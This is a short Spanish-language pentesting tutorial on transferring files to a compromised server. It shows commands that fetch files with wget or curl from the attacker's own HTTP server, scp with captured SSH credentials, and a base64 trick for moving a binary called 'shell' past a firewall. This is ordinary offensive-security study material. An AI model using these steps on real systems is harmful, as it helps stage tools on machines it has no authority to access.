---
title: Transferencia de archivos
published: true
---

Es habitual que, durante un ejercico de _pentesting_, necesitemos transferir archivos al servidor remoto; como _scripts_ de enumeración, _exploits_ o transferir datos a nuestra
máquina de ataque. Si bien algunas herramientas como Metasploit nos permiten usar el comando `Upload` para subir un fichero, debemos aprender métodos para transferirlos desde un
intérprete inverso estándar.

### [](#header-1)wget

Un método es correr un servidor HTTP con Python en nuestra máquina y usar `wget` o `cURL` para descargar el archivo en la máquina remota. Primero, vamos al directorio que contiene
el archivo que nos interesa transferir y lanzamos un servidor HTTP con Python allí:  
`cd /tmp`  
`python3 -m http.server 8000`  
Ahora podemos descargar el archivo en la máquina remota (RCE) con:  
`wget http://<nuestra_IP>:8000/<archivo>`  
Si la máquina remota no tiene `wget` podemos usar `cURL`:  
`curl http://<nuestra_IP>:8000/<archivo> -o <nombre_que_le_damos>`

### [](#header-2)SCP

Otro método de transferencia es `scp`, para usarlo debemos haber conseguido crendeciales de usuario ssh en la máquina remota. Ejemplo:  
`scp <archivo> <usuario>@<IP_remota>:/<directorio_remoto>/<nombre_archivo>`

### [](#header-3)Base64

En algunos casos no podremos transferir el archivo. Debido a, por ejemplo, un cortafuegos que nos impida descargar un archivo desde nuestra máquina. Cuando esto nos ocurra,
podemos usar un truco simple para codificar el archivo en formato `base64`, copiar la cadena en el servidor y descodificarla. Si quisiéramos transferir un binario llamado `shell`,
haríamos:  
`base64 <nombre_archivo> -w 0`  
Copiaríamos la cadena de texto y en la máquina remota:  
`echo <cadena_de_texto> | base64 -d > <nombre_archivo>`  

### [](#header-4)Validar Archivos Transferidos

Para validar el formato de un fichero:  
`file <archivo>`  
Si se corresponde con lo que pretendíamos enviar, lo más seguro es que haya sido un envío exitoso.  
De todas formas, podemos asegurarnos de que no hemos fallado al codificar/descodificar el archivo comparando las cadenas md5 hash:  
1. En nuestra máquina:  
`md5sum <archivo>`  
2. En el objetivo:  
`md5sum <archivo>`
3. Comparamos las cadenas (iguales == correcto)

Hay más métodos de transferencia de ficheros, que podemos estudiar en el módulo *File Transfers*. 
